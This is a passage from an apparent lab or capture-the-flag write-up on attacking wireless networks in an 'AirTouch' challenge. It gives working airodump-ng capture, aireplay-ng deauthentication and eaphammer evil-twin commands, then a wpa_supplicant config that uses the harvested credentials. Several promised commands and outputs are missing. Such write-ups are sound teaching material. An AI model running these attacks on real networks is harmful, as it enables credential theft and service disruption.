First, uncomment the last line of /etc/snmp/snmp.conf:

Let’s try capturing the full packets of AirTouch-Internet:

airodump-ng -c 6 -w wpa --essid 'AirTouch-Internet' --bssid F0:9F:C2:A3:F1:A7 wlan0

-c 6 because AirTouch-Internet is on channel 6, -w wpa is the name of the output file, and the BSSID in the flag is the one from AirTouch-Internet. This will start capturing packets. Let’s keep that session open and trigger a client deauthentication from another shell.

The output of the airodump command should look something like this:

We can see a client connected to the AirTouch-Internet. Notice that the frames go up as time passes. That means that this client is exchanging data with AirTouch-Internet. If we trigger a deauthentication, that tells the AP that the association between the AirTouch-Internet and the client is no longer valid. This means that the client will immediately try to reconnect to the access point, triggering a 4-way WPA handshake.

We can confirm that by running the deauth:

Evil-Twin Attack​

We can bring server.crt , ca.crt and server.key over to the first machine that had eaphammer in it (by just using cat to read the each file and copy-pasting it)

We can use those certificates along with eaphammer to create a rogue AP that will harvest credentials for us. This is called an Evil-Twin attack.

First, let’s set wlan0 to monitoring mode

airmon-ng start wlan0 44

This will set up the wlan0mon interface on channel 44 (the channel AirTouch-Office is on)

Then, let’s use airodump-ng to get the required information for the attack:

Then, let’s set up the rogue AP with eaphammer:

./eaphammer --interface wlan3 --essid "AirTouch-Office" \
--channel 44 --auth wpa-eap \
--server-cert server.crt --private-key server.key --ca-cert ca.crt --creds

This will set up an AP with the same SSID as our target using the certificates we found. Now in a separate session, let’s try triggering a deauthentication so that the client reconnects to us instead of the actual AP.

aireplay-ng -0 10 -a AC:8B:A9:F3:A1:13 wlan0mon
aireplay-ng -0 10 -a AC:8B:A9:AA:3F:D2 wlan0mon

AirTouch-Office​

Now that we have enterprise credentials, we can connect to the AirTouch-Office network. First, let’s write the configuration file that we are going to use with wpa_supplicant :

network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
}

We can tell from the output of eaphammer and the fact that we have enterprise credentials that the authentication method is going to be MSCHAPv2, and from airdump we have found out that it is using WPA-EAP. We can now connect to that network:
